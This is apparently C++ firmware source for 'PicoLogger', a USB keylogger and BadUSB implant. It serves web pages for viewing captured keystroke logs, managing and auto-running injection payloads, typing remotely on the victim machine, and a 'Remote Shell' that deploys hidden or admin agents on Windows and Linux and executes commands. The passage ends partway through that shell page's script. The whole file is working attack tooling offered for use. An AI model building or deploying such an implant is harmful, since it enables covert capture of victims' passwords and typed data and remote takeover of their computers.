// ======================================= HTML Pages ============================================= 

// =============================================== Keylogger / Homepage ================================================== 
void handleRoot() {
    String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Keylogger</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 60px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
            h2{text-align:center;color:#fc0}
            button{display:block;width:100%;padding:10px;margin-top:10px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s}
            button:hover{background:#fa0}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
        function toggleMenu() {
            const overlay = document.getElementById("menuOverlay");
            overlay.classList.toggle("active");
        }
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
          <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>USB Keylogger Logs</h2>
            <pre style="text-align:left;background-color:#333;border:1px solid #555;padding:15px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:400px;overflow-y:auto">)rawliteral";    
    html += readLogFile();   
    html += R"rawliteral(</pre>
            <form action='/clear' method='POST'>
                <button type='submit'>Clear Logs</button>
            </form>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", html);
}



// ======================================================== Payload Manager Page ============================================================
void handlePayloadsPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Payload Manager</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 60px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
            h2,h3{text-align:center;color:#fc0}
            input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
            button{display:block;width:100%;padding:10px;margin-top:10px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s}
            button:hover{background:#fa0}
            table{width:100%;margin-top:20px;border-collapse:collapse;text-align:left}
            table,td,th{border:1px solid #444}
            td,th{padding:10px;background:#333}
            .action-buttons{display:flex;gap:10px}
            .action-buttons button{flex:1;padding:8px 12px;font-size:14px;border:none;cursor:pointer;background:#fc0;color:#000;border-radius:5px;transition:.3s}
            .action-buttons button:hover{background:#fa0}
            .switch{position:relative;display:inline-block;width:34px;height:20px}
            .switch input{opacity:0;width:0;height:0}
            .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;border-radius:20px;transition:.4s}
            .slider:before{position:absolute;content:"";height:14px;width:14px;left:3px;bottom:3px;background-color:#fff;transition:.4s;border-radius:50%}
            input:checked+.slider{background-color:#fc0}
            input:checked+.slider:before{transform:translateX(14px)}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function loadPayloads() {
                fetch('/list_payloads')
                .then(response => response.json())
                .then(payloads => {
                    fetch('/list_boot_payloads')
                    .then(response => response.json())
                    .then(enabledPayloads => {
                        let table = document.getElementById('payloadTable');
                        table.innerHTML = '<tr><th>Filename</th><th>Actions</th><th>Boot</th></tr>';
                        payloads.forEach(file => {
                            let isChecked = enabledPayloads.includes(file) ? "checked" : "";
                            table.innerHTML += `
                                <tr>
                                    <td>${file}</td>
                                    <td class="action-buttons">
                                        <button onclick="runPayload('${file}')">Run</button>
                                        <button onclick="editPayload('${file}')">Edit</button>
                                        <button onclick="deletePayload('${file}')">Delete</button>
                                    </td>
                                    <td>
                                        <label class="switch">
                                            <input type="checkbox" onchange="togglePayloadOnBoot('${file}', this.checked)" id="boot-${file}" ${isChecked}>
                                            <span class="slider"></span>
                                        </label>
                                    </td>
                                </tr>
                            `;
                        });
                    });
                });
            }
            function togglePayloadOnBoot(filename, enable) {
                fetch('/toggle_payload_boot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `filename=${encodeURIComponent(filename)}&enable=${enable ? 1 : 0}`
                }).then(() => {
                    alert(`Payload ${filename} ${enable ? 'enabled' : 'disabled'} on boot!`);
                });
            }
            function createNewFile() {
                let filename = document.getElementById('filename').value;
                let content = document.getElementById('editor').value;
                savePayload(filename, content);
            }
            function savePayload(filename, content) {
                fetch('/save_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}&content=${encodeURIComponent(content)}`
                }).then(() => {
                    alert("Saved successfully!");
                    loadPayloads();
                });
            }
            function deletePayload(filename) {
                fetch('/delete_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}`
                }).then(() => {
                    alert("Deleted successfully!");
                    loadPayloads();
                });
            }
            function runPayload(filename) {
                fetch('/run_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}`
                }).then(() => alert("Payload executed!"));
            }
            function editPayload(filename) {
                fetch(`/get-payload?filename=${encodeURIComponent(filename)}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error("Failed to fetch payload");
                    }
                    return response.text();
                })
                .then(data => {
                    document.getElementById('filename').value = filename;
                    document.getElementById('editor').value = data;
                })
                .catch(error => {
                    console.error("Error fetching payload:", error);
                });
            }
            window.onload = loadPayloads;
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
<div class="ascii-container" align="center">
    <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
    </pre>
</div>
        <div class="container">
            <h2>BadUSB Payload Manager</h2>
            <input type="text" id="filename" placeholder="Enter filename"><br>
            <textarea id="editor" rows="15" placeholder="Write your payload here..."></textarea><br>
            <button onclick="createNewFile()">Save</button>
            
            <h3>Available Payloads</h3>
            <table id="payloadTable">
                <tr><th>Filename</th><th>Actions</th></tr>
            </table>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}


// =========================================== Settings Page ========================================
void handleSettingsPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Settings</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 60px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
            h2,h3{text-align:center;color:#fc0}
            input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
            button{display:block;width:100%;padding:10px;margin-top:10px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s}
            button:hover{background:#fa0}
            .switch{position:relative;display:inline-block;width:34px;height:20px}
            .switch input{opacity:0;width:0;height:0}
            .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;border-radius:20px;transition:.4s}
            .slider:before{position:absolute;content:"";height:14px;width:14px;left:3px;bottom:3px;background-color:#fff;transition:.4s;border-radius:50%}
            select{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;}
            input:checked+.slider{background-color:#fc0}
            input:checked+.slider:before{transform:translateX(14px)}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function saveSettings() {
                const ssid = document.getElementById('ssid').value;
                const password = document.getElementById('password').value;
                const wifiState = document.getElementById('wifiState').checked ? 'ON' : 'OFF';
                const layout = document.getElementById('layout').value;
            
                fetch('/save_settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}&wifiState=${wifiState}&layout=${layout}`
                })
                .then(response => {
                    if (response.ok) {
                        alert("Settings saved successfully!");
                    } else {
                        alert("Failed to save settings! Server responded with status: " + response.status);
                    }
                })
                .catch(err => {
                    alert("Network error: Failed to save settings!");
                    console.error("Error:", err);
                });
            }
            function formatLittleFS() {
                if (confirm('Are you sure you want to format the LittleFS? All data will be lost.')) {
                    fetch('/format_littlefs', { method: 'POST' })
                        .then(() => alert('LittleFS formatted successfully!'))
                        .catch(err => alert('Failed to format LittleFS!'));
                }
            }
            function rebootPico() {
                if (confirm('Are you sure you want reboot PicoLogger?')) {
                    fetch('/reboot_pico', { method: 'POST' })
                        .then(() => alert('Restarting PicoLogger!'))
                        .catch();
                }
            }
            window.onload = function() {
                fetch('/load_settings')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('ssid').value = data.ssid;
                        document.getElementById('password').value = data.password;
                        document.getElementById('wifiState').checked = data.wifiState === 'ON';
                        document.getElementById('layout').value = data.layout || 'us';
                    });
            }
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
        <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Settings</h2>
            <div class="input-group">
                <label for="ssid">WiFi SSID:</label>
                <input type="text" id="ssid" placeholder="Enter WiFi SSID">
            </div>
            <div class="input-group">
                <label for="password">WiFi Password:</label>
                <input type="text" id="password" placeholder="Enter WiFi Password">
            </div>        
            <div class="input-group">
                <label for="layout">Keyboard Layout:</label>
                <select id="layout">
                    <option value="us">US</option>
                    <option value="fr">French</option>
                    <option value="de">German</option>
                    <option value="es">Spanish</option>
                    <option value="it">Italian</option>
                    <option value="pt">Portuguese</option>
                    <option value="fi">Finnish</option>
                    <option value="be">Belgian</option>
                    <option value="br">Brazilian</option>
                    <option value="tr">Turkish</option>
                    <option value="dk">Danish</option>
                    <option value="uk">UK</option>
                </select>
            </div>
            <div class="input-group">
                <label for="wifiState">WiFi ON/OFF:</label>
                <label class="switch">
                    <input type="checkbox" id="wifiState">
                    <span class="slider"></span>
                </label>
                 <label for="wifiState"><code> (Use serial command '<strong>wifion</strong>' to re-enable)</code></label>
            </div>
            <button onclick="saveSettings()">Save</button>
            <button onclick="formatLittleFS()" class="warning">Format LittleFS</button>
            <button onclick="rebootPico()" class="warning">Reboot PicoLogger</button>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

// ============================================== Virtual Keyboard Page ====================================================
void handleKeyboardPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Virtual Keyboard</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95)!important; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 40px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
            h2{text-align:center;color:#fc0}
            .keyboard{display:grid;grid-template-columns:repeat(16,1fr);gap:5px;justify-content:center;align-items:center;padding:10px}
            .key{padding:15px;background:#444;border-radius:5px;text-align:center;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;user-select:none}
            .key:hover{background:#fc0;color:#000}
            .key-wide{grid-column:span 2}
            .key-space{grid-column:span 11;justify-content:center;align-items:center;margin-left:50%}
            #alt,#capslock,#ctrl,#gui,#shift{background:#666}
            .active{background:#fc0!important;color:#000!important}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            let capsLock = false;
            let shiftActive = false;
            let guiActive = false;
            let altActive = false;
            let ctrlActive = false;
            function sendKeyPress(key) {
                let keys = [];
                if (ctrlActive) keys.push("CTRL");
                if (altActive) keys.push("ALT");
                if (guiActive) keys.push("GUI");
                if (key.length === 1) {
                    if (shiftActive || capsLock) {
                        key = key.toUpperCase();
                    } else {
                        key = key.toLowerCase();
                    }
                }
                keys.push(key);
                let combo = keys.join("+");
                fetch('/keypress', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'key=' + encodeURIComponent(combo)
                }).then(response => response.text()).then(data => {
                    console.log('Key sent:', combo);
                }).catch(error => console.error('Error:', error));

                if (shiftActive) {
                    toggleShift(false);
                }
            }
            function toggleCapsLock() {
                capsLock = !capsLock;
                document.getElementById('capslock').classList.toggle('active', capsLock);
            }
            function toggleShift(state) {
                shiftActive = state;
                document.getElementById('shift').classList.toggle('active', shiftActive);
            }
            function toggleKey(key) {
                let element = document.getElementById(key);
                let state = !eval(key + "Active");
                eval(key + "Active = state;");
                element.classList.toggle('active', state);
            }
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8)!important; backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
          <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Virtual Keyboard</h2>
            <div class="keyboard">
                <div class="key key-wide" onclick="sendKeyPress('ESC')">ESC</div>
                <div class="key" onclick="sendKeyPress('1')">1</div>
                <div class="key" onclick="sendKeyPress('2')">2</div>
                <div class="key" onclick="sendKeyPress('3')">3</div>
                <div class="key" onclick="sendKeyPress('4')">4</div>
                <div class="key" onclick="sendKeyPress('5')">5</div>
                <div class="key" onclick="sendKeyPress('6')">6</div>
                <div class="key" onclick="sendKeyPress('7')">7</div>
                <div class="key" onclick="sendKeyPress('8')">8</div>
                <div class="key" onclick="sendKeyPress('9')">9</div>
                <div class="key" onclick="sendKeyPress('0')">0</div>
                <div class="key" onclick="sendKeyPress('-')">-</div>
                <div class="key" onclick="sendKeyPress('=')">=</div>
                <div class="key key-wide" onclick="sendKeyPress('BACKSPACE')">BKSP</div>
                
                <div class="key key-wide" onclick="sendKeyPress('TAB')">TAB</div>
                <div class="key" onclick="sendKeyPress('q')">Q</div>
                <div class="key" onclick="sendKeyPress('w')">W</div>
                <div class="key" onclick="sendKeyPress('e')">E</div>
                <div class="key" onclick="sendKeyPress('r')">R</div>
                <div class="key" onclick="sendKeyPress('t')">T</div>
                <div class="key" onclick="sendKeyPress('y')">Y</div>
                <div class="key" onclick="sendKeyPress('u')">U</div>
                <div class="key" onclick="sendKeyPress('i')">I</div>
                <div class="key" onclick="sendKeyPress('o')">O</div>
                <div class="key" onclick="sendKeyPress('p')">P</div>
                <div class="key" onclick="sendKeyPress('[')">[</div>
                <div class="key" onclick="sendKeyPress(']')">]</div>
                <div class="key key-wide" id="capslock" onclick="toggleCapsLock()">CAPS</div>
                
                <div class="key key-wide" id="shift" onmousedown="toggleShift(true)" onmouseup="toggleShift(false)">SHIFT</div>
                <div class="key" onclick="sendKeyPress('a')">A</div>
                <div class="key" onclick="sendKeyPress('s')">S</div>
                <div class="key" onclick="sendKeyPress('d')">D</div>
                <div class="key" onclick="sendKeyPress('f')">F</div>
                <div class="key" onclick="sendKeyPress('g')">G</div>
                <div class="key" onclick="sendKeyPress('h')">H</div>
                <div class="key" onclick="sendKeyPress('j')">J</div>
                <div class="key" onclick="sendKeyPress('k')">K</div>
                <div class="key" onclick="sendKeyPress('l')">L</div>
                <div class="key" onclick="sendKeyPress(';')">;</div>
                <div class="key" onclick="sendKeyPress('\'')">&#39;</div>
                <div class="key" onclick="sendKeyPress('\\')">\</div>
                <div class="key key-wide" onclick="sendKeyPress('ENTER')">ENTER</div>
                <br></br>
                <div class="key" id="ctrl" onclick="toggleKey('ctrl')">CTRL</div>
                <div class="key" id="alt" onclick="toggleKey('alt')">ALT</div>              
                <div class="key" onclick="sendKeyPress('z')">Z</div>
                <div class="key" onclick="sendKeyPress('x')">X</div>
                <div class="key" onclick="sendKeyPress('c')">C</div>
                <div class="key" onclick="sendKeyPress('v')">V</div>
                <div class="key" onclick="sendKeyPress('b')">B</div>
                <div class="key" onclick="sendKeyPress('n')">N</div>
                <div class="key" onclick="sendKeyPress('m')">M</div>
                <div class="key" onclick="sendKeyPress(',')">,</div>
                <div class="key" onclick="sendKeyPress('.')">.</div>
                <div class="key" onclick="sendKeyPress('/')">/</div>                                
                <div class="key" id="gui" onclick="toggleKey('gui')">GUI</div>
                <br></br>
                <div class="key key-space" onclick="sendKeyPress('SPACE'); sendKeyPress(' ');">SPACE</div>
            </div>
        </div>
            <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

// =================================================== Remote Shell Page ======================================================
void handleShell() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Remote Shell</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
            h2{text-align:center;color:#fc0}
            textarea{box-sizing:border-box;width:100%;height:250px;padding:10px;border-radius:5px;border:none;background:#333;color:#fff}
            input{width:70%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;font-size:16px}
            button{width:20%;padding:10px;margin-left:5px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s;height: 42px;}
            button:hover{background:#fa0}
            .switch-container{display:flex;justify-content:center;gap:10px;margin:10px 0}
            .switch{position:relative;display:inline-block;width:60px;height:34px}
            .switch input{opacity:0;width:0;height:0}
            .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#444;transition:.4s;border-radius:34px}
            .slider:before{position:absolute;content:"";height:26px;width:26px;left:4px;bottom:4px;background-color:#fff;transition:.4s;border-radius:50%}
            input:checked+.slider{background-color:#fc0}
            input:checked+.slider:before{transform:translateX(26px)}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function loadPassword() {
                fetch('/get_password')
                    .then(response => response.text())
                    .then(password => {
                        document.getElementById("passwordInput").value = password;
                    })
                    .catch(error => console.error('Error loading password:', error));
            }            
            function deployBashAgent() {
                let password = document.getElementById("passwordInput").value;
                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
                fetch('/deploy_linux', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'password=' + encodeURIComponent(password) + '&hidden=' + hiddenMode
                })
                .then(response => response.text())
                .then(output => {
                    alert(output);
                })
                .catch(error => console.error('Error deploying bash agent:', error));
            }
            function deployAgent() {
                let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";

                fetch('/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'admin=' + adminMode + '&hidden=' + hiddenMode
                })
                .then(response => response.text())
                .then(output => {
                    alert("Agent Deployed!");
                })
                .catch(error => console.error('Error deploying agent:', error));
            }
            function executeCommand() {
                let command = document.getElementById("commandInput").value;
                if (command.trim() === "") return;
                
                fetch('/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'command=' + encodeURIComponent(command)
                })
                .then(response => response.text())
                .then(output => {
                    document.getElementById("outputBox").value += "\n> " + command + "\n" + output + "\n";
                    document.getElementById("commandInput").value = "";
                })
                .catch(error => console.error('Error executing command:', error));
            }
            document.addEventListener("DOMContentLoaded", loadPassword);
